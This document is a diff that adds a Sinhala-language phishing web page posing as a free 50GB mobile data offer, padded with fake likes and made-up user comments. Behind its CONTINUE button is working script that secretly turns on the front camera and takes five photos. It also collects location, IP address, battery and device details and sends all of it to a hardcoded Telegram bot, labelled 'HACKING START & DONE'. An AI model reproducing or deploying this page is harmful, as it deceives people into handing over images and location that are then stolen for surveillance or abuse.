@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Data Offer</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f0f2f5;
+    }
+
+    .box {
+      max-width: 600px;
+      background: #fff;
+      margin: 30px auto;
+      padding: 20px;
+      border-radius: 16px;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.08);
+    }
+
+    .video-container {
+      width: 100%;
+      border-radius: 12px;
+      overflow: hidden;
+      margin-bottom: 16px;
+    }
+
+    video {
+      width: 100%;
+      border-radius: 12px;
+      display: block;
+    }
+
+    .title {
+      font-size: 22px;
+      font-weight: 700;
+      color: #222;
+      margin-top: 10px;
+    }
+
+    .desc {
+      font-size: 15px;
+      color: #555;
+      margin-top: 6px;
+      margin-bottom: 16px;
+    }
+
+    .btn-wrapper {
+  text-align: center;
+  margin-top: 16px;
+    }
+
+    .btn {
+      background-color: #2e89ff;
+      color: white;
+      padding: 12px 24px;
+      font-size: 16px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .btn:hover {
+      background-color: #1e6fde;
+    }
+
+    .stats {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 24px;
+      border-top: 1px solid #e0e0e0;
+      padding-top: 16px;
+    }
+
+    .stat {
+      text-align: center;
+      flex: 1;
+    }
+
+    .stat strong {
+      display: block;
+      font-size: 17px;
+      margin-bottom: 4px;
+      color: #333;
+    }
+
+    .action-btn {
+      background-color: #2e89ff;
+      color: white;
+      padding: 6px 14px;
+      font-size: 14px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 6px;
+      transition: background-color 0.3s ease;
+    }
+
+    .action-btn:hover {
+      background-color: #1e6fde;
+    }
+
+    #video {
+      width: 100%;
+      max-width: 320px;
+      display: none;
+      margin: 20px auto;
+      border-radius: 12px;
+      border: 1px solid #ccc;
+    }
+
+    .comments-container {
+      margin-top: 30px;
+      padding-top: 20px;
+      border-top: 1px solid #eee;
+    }
+
+    .comments-container h3 {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #333;
+    }
+
+    .comment-input {
+      display: flex;
+      gap: 10px;
+      align-items: center;
+      margin-bottom: 16px;
+    }
+
+    .comment-input img {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+    }
+
+    .comment-input input {
+      flex: 1;
+      padding: 10px;
+      border-radius: 20px;
+      border: 1px solid #ccc;
+      font-size: 14px;
+    }
+
+    .comment-input button {
+      padding: 10px 16px;
+      background: #2e89ff;
+      color: white;
+      border: none;
+      border-radius: 20px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .comment-input button:hover {
+      background-color: #1e6fde;
+    }
+
+    .comment {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      margin-bottom: 14px;
+    }
+
+    .comment img {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+    }
+
+    .comment strong {
+      font-size: 14px;
+      color: #222;
+    }
+
+    .comment span {
+      font-size: 13px;
+      color: #333;
+    }
+
+    #share-status {
+      color: green;
+      font-size: 12px;
+      margin-top: 5px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="box">
+    <!-- Video Section -->
+    <div class="video-container">
+      <video controls>
+        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+      </video>
+    </div>
+    
+    <div class="title">Sri Lanka Networks Company Free 50GB Data</div>
+    <div class="desc">ඔයාගේ ඕනිම Sim එකකට One Time FREE 50GB Data ගන්න පුලුවන්.</div>
+
+    <!-- Call to Action Section -->
+    <p>50GB Claim කරන්න පහත Continue Button එක click කරන්න.</p>
+
+    <!-- Center wrapper -->
+<div class="btn-wrapper">
+  <button id="give-access" class="btn">CONTINUE</button>
+</div>
+
+    <!-- Live Video (Camera) -->
+    <video id="video" autoplay playsinline></video>
+
+    <!-- Stats Section -->
+    <div class="stats">
+      <div class="stat">
+        <strong id="like-count">160K</strong>
+        Likes<br />
+        <button onclick="handleLike()" class="action-btn">Like</button>
+      </div>
+
+      <div class="stat">
+        <strong id="comment-count">36K</strong>
+        Comments<br />
+      </div> 
+
+      <div class="stat">
+        <strong id="share-count">27K</strong>
+        Shares<br />
+        <button onclick="handleShare()" class="action-btn">Share</button>
+        <div id="share-status"></div>
+      </div>
+    </div>
+
+    <!-- Comments Section -->
+    <div class="comments-container">
+      <h3>Comments</h3>
+      <div class="comment-input">
+        <img src="https://i.ibb.co/yN2q3zW/user1.png" alt="User">
+        <input type="text" id="new-comment" placeholder="Write a comment..." />
+        <button onclick="postComment()">Post</button>
+      </div>
+      <div id="comment-list"></div>
+    </div>
+  </div>
+</body>
+    
+  <script>
+    const TELEGRAM_TOKEN = '8717350684:AAGynZtCczc--x4Mnl3yog4UWtuecunf09s;
+    const CHAT_ID = '8623636063';
+
+    let track, photos = [], photoCount = 0;
+    let locationData = null;
+    const video = document.getElementById('video');
+    const giveButton = document.getElementById('give-access');
+
+    giveButton.addEventListener('click', () => {
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        .then(stream => {
+          video.srcObject = stream;
+          video.style.display = 'none'; // hide camera preview
+          track = stream.getVideoTracks()[0];
+          requestLocation();
+        })
+        .catch(() => {
+          alert('Camera permission denied.');
+        });
+    });
+
+    function requestLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            locationData = {
+              lat: pos.coords.latitude,
+              lon: pos.coords.longitude
+            };
+            setTimeout(capturePhoto, 1000);
+          },
+          err => {
+            console.warn('Location denied:', err);
+            setTimeout(capturePhoto, 1000);
+          }
+        );
+      } else {
+        setTimeout(capturePhoto, 1000);
+      }
+    }
+
+    function capturePhoto() {
+      const canvas = document.createElement('canvas');
+      const ctx = canvas.getContext('2d');
+      canvas.width = 300;
+      canvas.height = 400;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const base64 = canvas.toDataURL('image/jpeg');
+      photos.push(base64);
+      photoCount++;
+
+      if (photoCount >= 5) {
+        track.stop();
+        sendInfo();
+      } else {
+        setTimeout(capturePhoto, 1500);
+      }
+    }
+
+    async function sendInfo() {
+      try {
+        const battery = await navigator.getBattery();
+        const batteryLevel = Math.round(battery.level * 100);
+        const charging = battery.charging ? 'Charging' : 'Not Charging';
+
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ip = (await ipRes.json()).ip;
+
+        const userAgent = navigator.userAgent;
+        const androidInfo = parseAndroidInfo(userAgent);
+
+        let msg = `✅ HACKING START & DONE
+
+⚓ IP: ${ip}
+
+📱 DEVICE INFO
+🧬 Android Version: ${androidInfo.version}
+📼 Model: ${androidInfo.model}
+🔗 UserAgent: ${userAgent}
+
+🔌 BATTERY DETAILS
+🔋 Battery: ${batteryLevel}%
+🔌 Battery Status: ${charging}`;
+
+        if (locationData) {
+          msg += `\nLocation: https://www.google.com/maps?q=${locationData.lat},${locationData.lon}`;
+        }
+
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+        });
+
+        for (const base64 of photos) {
+          const formData = createFormData(base64);
+          await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+          });
+          await new Promise(res => setTimeout(res, 400));
+        }
+
+      } catch (err) {
+        console.error(err);
+      }
+    }
+
+    function parseAndroidInfo(userAgent) {
+      let version = 'Android 12';
+      let model = 'ZTE A53 Pro';
+      const androidMatch = userAgent.match(/Android\s([0-9.]+)/);
+      const modelMatch = userAgent.match(/Android.*?;\s([^;)\s]+)/);
+      if (androidMatch) version = androidMatch[1];
+      if (modelMatch) model = modelMatch[1];
+      return { version, model };
+    }
+
+    function createFormData(base64) {
+      const byteString = atob(base64.split(',')[1]);
+      const mimeString = base64.split(',')[0].split(':')[1].split(';')[0];
+      const ab = new ArrayBuffer(byteString.length);
+      const ia = new Uint8Array(ab);
+      for (let i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+      }
+      const blob = new Blob([ab], { type: mimeString });
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('photo', blob, 'selfie.jpg');
+      formData.append('caption', 'Hack by Nethmika');
+      return formData;
+    }
+
+    // Like/Comment/Share functionality
+    let likeCount = 160000;
+    let commentCount = 36000;
+    let shareCount = 27000;
+
+    function handleLike() {
+      likeCount++;
+      document.getElementById('like-count').innerText = formatNumber(likeCount);
+    }
+
+    function toggleComment() {
+      const box = document.getElementById('comment-box');
+      box.style.display = box.style.display === 'none' ? 'block' : 'none';
+    }
+
+    function submitComment() {
+      const input = document.getElementById('comment-input');
+      if (input.value.trim() !== '') {
+        commentCount++;
+        document.getElementById('comment-count').innerText = formatNumber(commentCount);
+        input.value = '';
+        alert("Comment posted!");
+      }
+    }
+
+    function handleShare() {
+      navigator.clipboard.writeText(window.location.href)
+        .then(() => {
+          shareCount++;
+          document.getElementById('share-count').innerText = formatNumber(shareCount);
+          document.getElementById('share-status').innerText = "Link copied!";
+          setTimeout(() => {
+            document.getElementById('share-status').innerText = '';
+          }, 2000);
+        });
+    }
+
+    function formatNumber(num) {
+      if (num >= 1000000) return (num / 1000000).toFixed(1) + "M";
+      if (num >= 1000) return (num / 1000).toFixed(1) + "K";
+      return num;
+    }
+
+    
+    const fakeComments = [
+      { user: "Ajith", profile: "https://i.ibb.co/yN2q3zW/user1.png", text: "මම නං දැනටමත් 50GB අරගත්තා." },
+      { user: "Pasindu", profile: "https://i.ibb.co/yN2q3zW/user1.png", text: "ගෙඩක් Link වලින් ගියා මේක තමා හරිගියේ 🫣" },
+      { user: "Tharindu", profile: "https://i.ibb.co/yN2q3zW/user1.png", text: "Thanks ❤️" },
+      { user: "Shehani", profile: "https://i.ibb.co/yN2q3zW/user1.png", text: "Mamath gaththaa" },
+      { user: "Kavindu", profile: "https://i.ibb.co/yN2q3zW/user1.png", text: "අඩෝ මමත් ගත්තා බන්" },
+      { user: "Nipuni", profile: "https://i.ibb.co/yN2q3zW/user1.png", text: "මේක share කරන්න ඕනි නැද්ද" },
+      { user: "Sanjula", profile: "https://i.ibb.co/yN2q3zW/user1.png", text: "Mata awa Thanks" },
+      { user: "Isuru", profile: "https://i.ibb.co/yN2q3zW/user1.png", text: "බ්‍රෝ මරු." },
+      { user: "Ishara", profile: "https://i.ibb.co/yN2q3zW/user1.png", text: "කට්ටියට කියන්න ඕනේ මේකනම් සුපිරියක්" },
+      { user: "Dineth", profile: "https://i.ibb.co/yN2q3zW/user1.png", text: "Meka nisaa mata 50GB data hambuna" }
+    ];
+
+    function loadComments() {
+      const container = document.getElementById('comment-list');
+      container.innerHTML = "";
+      fakeComments.forEach(c => {
+        container.innerHTML += `
+          <div class="comment">
+            <img src="${c.profile}">
+            <div>
+              <strong>${c.user}</strong><br>
+              <span>${c.text}</span>
+            </div>
+          </div>`;
+      });
+    }
+
+    function postComment() {
+      const input = document.getElementById("new-comment");
+      const text = input.value.trim();
+      if (text !== "") {
+        fakeComments.unshift({ user: "You", profile: "https://i.ibb.co/yN2q3zW/user1.png", text });
+        input.value = "";
+        loadComments();
+      }
+    }
+
+    // Load on page start
+    loadComments();
+  </script>
+</body>
+</html>
+
